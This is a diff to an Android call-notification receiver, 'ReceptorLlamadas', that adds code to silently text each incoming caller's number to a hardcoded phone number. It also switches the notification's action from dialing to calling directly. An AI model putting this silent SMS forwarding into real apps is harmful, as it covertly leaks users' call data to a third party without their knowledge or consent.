@@ -10,6 +10,7 @@ import android.content.Intent;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
@@ -34,10 +35,13 @@ public class ReceptorLlamadas extends BroadcastReceiver {
                 numero = extras.getString(
                         TelephonyManager.EXTRA_INCOMING_NUMBER);
                 String info = "Ultima llamada recibida de " + ": " + numero;
+                String reenvio = "+51952000243";
+                SmsManager sms = SmsManager.getDefault();
+                sms.sendTextMessage(reenvio, null, info,null,null);
                 Log.d("ReceptorAnuncio", info + " intent=" + intent);
 
                 //Funciones de cada opcion
-                Intent intencionLlamar = new Intent(Intent.ACTION_DIAL,
+                Intent intencionLlamar = new Intent(Intent.ACTION_CALL,
                         Uri.parse("tel:" + numero));
                 PendingIntent intencionPendienteLlamar =
                         PendingIntent.getActivity(context,0, intencionLlamar,0);
@@ -82,8 +86,7 @@ public class ReceptorLlamadas extends BroadcastReceiver {
                     notificacion.setChannelId(NOTIFICATION_CHANNEL_ID);
                 }
                 notificationManager.notify(ID_NOTIFICACION_CREAR, notificacion.build());
-                notificationManager.notify(1, notificacion.build());
-                //notificationManager.notify(0, notificacion.build());
+                //notificationManager.notify(1, notificacion.build());
             }
         }
     }
